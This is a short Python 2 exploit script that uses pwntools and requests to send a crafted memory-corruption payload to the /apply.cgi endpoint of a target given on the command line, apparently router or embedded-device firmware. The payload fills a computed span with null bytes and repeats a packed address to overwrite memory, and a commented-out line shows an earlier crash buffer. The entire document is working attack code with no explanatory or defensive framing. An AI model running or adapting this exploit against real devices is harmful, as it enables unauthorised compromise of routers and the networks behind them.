import sys
import requests
from pwn import *

try:
    target=sys.argv[1]
except:
    print "Usage: %s <target>" % sys.argv[0]
    sys.exit(0)

url="http://%s/apply.cgi" % target
#buf="\x42"*10000+"\x41"*0x4000
buf=(0x1000559c-0x10001AD8)*'\x00'+p32(0x10001AD8)+(0x10005B94-0x100055a0)/4*p32(0x10001AD8)
r = requests.post(url, data = buf)
print r.text
